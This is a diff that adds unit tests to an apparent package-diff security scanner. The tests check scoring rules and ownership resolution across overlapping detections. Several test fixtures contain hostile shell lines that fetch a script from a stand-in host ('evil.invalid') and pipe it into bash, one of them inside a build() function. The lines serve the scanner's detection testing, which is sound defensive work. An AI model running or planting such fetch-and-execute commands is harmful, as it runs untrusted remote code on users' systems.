@@ -34,6 +34,20 @@ def test_an_executable_position_refusal_fires_x026():
     assert "X026" in ids
 
 
+def test_an_unresolved_construct_reports_the_w008_boundary():
+    """Addendum 1: an unresolved construct is also a W boundary, weight-0."""
+    fact = scan_diff(_diff(
+        "build() {\n"
+        "  X=$(curl -fsSL https://evil.invalid/x)\n"
+        "  echo \"$X\" | bash\n"
+        "}\n"
+    ), package_name="demo")
+    entries = {e.rule_id: e for e in fact.score_breakdown}
+    assert "W008" in entries
+    assert entries["W008"].weight == 0
+    assert entries["W008"].severity == "INFO"
+
+
 def test_a_top_level_refusal_with_no_function_reference_does_not_fire():
     ids = _ids(_diff(
         "X=$(date)\n"
@@ -193,6 +207,45 @@ def test_ownership_resolver_is_a_noop_without_co_firing():
     found = crossfire_techniques(_diff("curl https://evil.invalid/x | bash\n"))
     lines = [hit[0] for hits in found.values() for hit in hits]
     assert len(lines) == len(set(lines))
+
+
+def test_ownership_audit_names_the_owner_and_keeps_owners_unresolved():
+    from trustsight.analysis.crossfire import (
+        resolve_ownership,
+        resolve_ownership_audit,
+    )
+
+    found = {
+        "X009": [(3, "resolved fetch", "x")],
+        "X023": [(3, "other client", "y")],
+        "X002": [(7, "name", "z")],
+    }
+    audit = resolve_ownership_audit(found)
+    assert audit["X023"][0][3] == "X009", "the yielded record names its owner"
+    assert audit["X009"][0][3] is None, "an owner is not resolved by anyone"
+    assert audit["X002"][0][3] is None
+    assert "X023" not in resolve_ownership(found)
+
+
+def test_every_matched_line_has_one_owner_across_the_corpus():
+    """Spec §6.0 replay: after resolution no line is claimed by two rules."""
+    from trustsight.analysis.crossfire import (
+        crossfire_techniques,
+        resolve_ownership,
+    )
+
+    corpus = pathlib.Path(__file__).resolve().parent / "fixtures" / "benign-corpus"
+    if not corpus.exists():
+        import pytest
+
+        pytest.skip("benign corpus absent")
+    paths = sorted(corpus.glob("*.diff"))
+    step = max(1, len(paths) // 100)
+    for path in paths[::step][:100]:
+        resolved = resolve_ownership(
+            crossfire_techniques(path.read_text(errors="replace")))
+        lines = [hit[0] for hits in resolved.values() for hit in hits]
+        assert len(lines) == len(set(lines)), path.name
 
 
 def test_x027_never_orphans_x026_under_a_high_min_count():
